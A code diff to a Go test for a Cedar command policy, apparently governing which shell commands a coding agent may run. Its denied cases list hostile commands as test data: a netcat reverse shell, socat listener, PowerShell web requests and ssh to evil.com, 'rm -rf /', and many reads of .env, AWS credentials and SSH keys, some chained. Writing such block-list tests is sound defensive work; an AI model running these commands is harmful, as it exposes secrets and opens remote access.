@@ -176,9 +176,15 @@ func TestRealPolicyCedarFile(t *testing.T) {
 		{"cargo", "cargo init --bin"},
 		{"pytest", "pytest -s tests/test_leak.py"},
 		{"ls", "ls -la"},
+		{"ls", "ls -al"},
+		{"ls", "ls -la .env"},
 		{"dir", "dir /b"},
+		{"dir", "dir .env"},
 		{"mkdir", "mkdir src"},
 		{"echo", "echo hello"},
+		{"cmd", "cmd /c dir"},
+		{"powershell", "powershell -Command Get-Process"},
+		{"grep", "grep -i 'test' file.txt"},
 	}
 
 	for _, tc := range allowedDevTools {
@@ -202,8 +208,19 @@ func TestRealPolicyCedarFile(t *testing.T) {
 		{"python", "python script.py && nc -e /bin/sh 1.2.3.4 5555", "nc"},
 		{"python", "python -c 'import os' && socat tcp-listen:4444 stdout", "socat"},
 		{"go", "go test && ssh user@evil.com", "ssh"},
+		{"powershell", "powershell -Command Invoke-WebRequest https://evil.com", "powershell Invoke-WebRequest"},
+		{"powershell", "powershell -Command iwr https://evil.com", "powershell iwr alias"},
 		{"ls", "ls -la ~/.aws/credentials", "~/.aws"},
-		{"ls", "ls -la .env", ".env"},
+		{"cat", "cat .env", "cat .env"},
+		{"type", "type .env", "type .env"},
+		{"more", "more .env", "more .env"},
+		{"head", "head -n 20 .env", "head .env"},
+		{"tail", "tail -n 20 .env", "tail .env"},
+		{"grep", "grep SECRET .env", "grep .env"},
+		{"findstr", "findstr KEY .env", "findstr .env"},
+		{"powershell", "powershell -Command Get-Content .env", "powershell Get-Content .env"},
+		{"echo", "echo hello && cat .env", "chained cat .env"},
+		{"git", "git status && type .env", "chained type .env"},
 		{"cat", "cat ~/.ssh/id_rsa", ".ssh"},
 	}
 
@@ -225,7 +242,6 @@ func TestRealPolicyCedarFile(t *testing.T) {
 		{"rm", "rm -rf /"},
 		{"bash", "bash -c 'whoami'"},
 		{"sh", "sh script.sh"},
-		{"powershell", "powershell -Command Get-Process"},
 	}
 
 	for _, tc := range deniedTools {
